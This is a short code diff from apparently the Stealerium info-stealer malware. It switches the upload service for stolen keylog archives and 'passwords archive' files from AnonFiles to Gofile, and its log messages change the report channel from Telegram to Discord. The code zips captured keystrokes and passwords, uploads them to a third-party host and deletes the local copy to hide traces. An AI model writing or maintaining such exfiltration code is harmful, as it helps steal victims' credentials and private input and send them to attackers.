@@ -132,7 +132,7 @@ namespace Stealerium
             var filename = DateTime.Now.ToString("yyyy-MM-dd_h.mm.ss");
             var archive = Filemanager.CreateArchive(log, false);
             File.Move(archive, filename + ".zip");
-            var url = AnonFiles.Upload(filename + ".zip");
+            var url = GofileFileService.UploadFile(filename + ".zip");
             File.Delete(filename + ".zip");
             File.AppendAllText(KeylogsHistory, "\t\t\t\t\t\t\t- " +
                                                $"[{filename.Replace("_", " ").Replace(".", ":")}]({url})\n");
@@ -256,12 +256,12 @@ namespace Stealerium
 
         public static void SendReport(string file)
         {
-            Logging.Log("Sending passwords archive to anonfile");
-            var url = AnonFiles.Upload(file);
+            Logging.Log("Sending passwords archive to Gofile");
+            var url = GofileFileService.UploadFile(file);
             File.Delete(file);
-            Logging.Log("Sending report to telegram");
+            Logging.Log("Sending report to discord");
             SendSystemInfo(url);
-            Logging.Log("Report sent to telegram bot");
+            Logging.Log("Report sent to discord");
         }
     }
 }
